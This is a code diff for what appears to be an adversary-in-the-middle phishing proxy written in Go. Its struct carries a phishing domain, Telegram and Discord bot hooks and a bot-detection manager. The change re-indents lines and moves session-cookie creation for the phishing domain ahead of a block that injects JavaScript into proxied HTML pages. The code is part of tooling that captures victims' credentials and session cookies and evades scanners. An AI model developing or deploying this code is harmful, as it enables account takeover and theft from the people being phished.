@@ -78,7 +78,7 @@ type HttpProxy struct {
 	telegram_bot      *tgbotapi.BotAPI
 	telegram_chat_id  int64
 	discord_bot       api.WebhookClient
-    botDetectionManager *BotDetectionManager
+  botDetectionManager *BotDetectionManager
 }
 
 type ProxySession struct {
@@ -193,7 +193,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		discord_bot:       nil,
 	}
 	
-    p.botDetectionManager = NewBotDetectionManager()
+  p.botDetectionManager = NewBotDetectionManager()
 	p.Server = &http.Server{
 		Addr:         fmt.Sprintf("%s:%d", hostname, port),
 		Handler:      p.Proxy,
@@ -905,8 +905,21 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			// handle session
-			ck := &http.Cookie{}
 			ps := ctx.UserData.(*ProxySession)
+      
+			ck := &http.Cookie{}
+			if ps.SessionId != "" {
+				if ps.Created {
+					ck = &http.Cookie{
+						Name:    p.cookieName,
+						Value:   ps.SessionId,
+						Path:    "/",
+						Domain:  ps.PhishDomain,
+						Expires: time.Now().UTC().Add(60 * time.Minute),
+						MaxAge:  60 * 60,
+					}
+				}
+			}
 			    // Only inject JS for HTML responses in active sessions
     if ps.SessionId != "" && resp.Header.Get("Content-Type") != "" {
         contentType := resp.Header.Get("Content-Type")
@@ -928,19 +941,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
             }
         }
     }
-
-			if ps.SessionId != "" {
-				if ps.Created {
-					ck = &http.Cookie{
-						Name:    p.cookieName,
-						Value:   ps.SessionId,
-						Path:    "/",
-						Domain:  ps.PhishDomain,
-						Expires: time.Now().UTC().Add(60 * time.Minute),
-						MaxAge:  60 * 60,
-					}
-				}
-			}
 
 			allow_origin := resp.Header.Get("Access-Control-Allow-Origin")
 			if allow_origin != "" && allow_origin != "*" {
